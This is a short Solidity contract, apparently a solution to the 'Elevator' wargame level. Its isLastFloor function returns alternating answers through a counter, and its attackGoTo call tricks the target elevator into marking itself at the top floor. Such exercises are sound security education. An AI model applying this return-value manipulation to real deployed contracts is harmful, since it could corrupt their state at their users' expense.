// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "./Elevator.sol";

interface Salivator {
    function goTo(uint256) external;
}

contract Building {
    // bool public top;
    uint256 public counter;
    address public elevator;

    constructor(address _elevator) public {
        elevator = _elevator;
    }

    // function goTo(uint256 _floor) public {
    //     Building building = Building(msg.sender);

    //     if (!building.isLastFloor(_floor)) {
    //         floor = _floor;
    //         top = building.isLastFloor(floor);
    //     }
    // }

    function isLastFloor(uint256 _floor) external returns (bool) {
        counter++;
        if (counter % 2 == 0) return true;
        else return false;
    }

    function attackGoTo() external {
        Salivator(elevator).goTo(0);
    }
}
